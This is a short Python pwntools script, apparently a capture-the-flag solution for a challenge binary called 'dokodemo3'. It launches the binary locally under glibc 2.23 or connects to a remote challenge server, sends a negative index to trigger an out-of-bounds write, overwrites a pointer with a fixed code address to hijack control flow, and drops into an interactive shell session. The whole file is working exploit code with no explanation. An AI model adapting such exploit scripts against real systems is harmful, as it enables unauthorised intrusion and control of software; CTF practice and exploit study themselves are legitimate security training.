from pwn import *
import sys
context.log_level = 'DEBUG'
context.terminal=["open-wsl.exe","-c"]

ver = '2.23'
elf_dir = './dokodemo3'
ld_dir = '/glibc/x64/{0}/lib/ld-{0}.so'.format(ver)

#libc_dir = './libc.so'
libc_dir = "/glibc/x64/{0}/lib/libc-{0}.so".format(ver)

if(len(sys.argv) == 1):
    #p = process(elf_dir)
    #p = process([elf_dir],env={"LD_PRELOAD": libc_dir})
    p = process(elf_dir, env={"LD_PRELOAD": libc_dir})
else:
    p = remote('pwn.mrh1s.top', 23003)

#gdb.attach(p, 'b *0x400982\nc')

p.sendlineafter('which?', '-14')
p.sendlineafter(' wish:', p64(0x400881))

p.interactive()
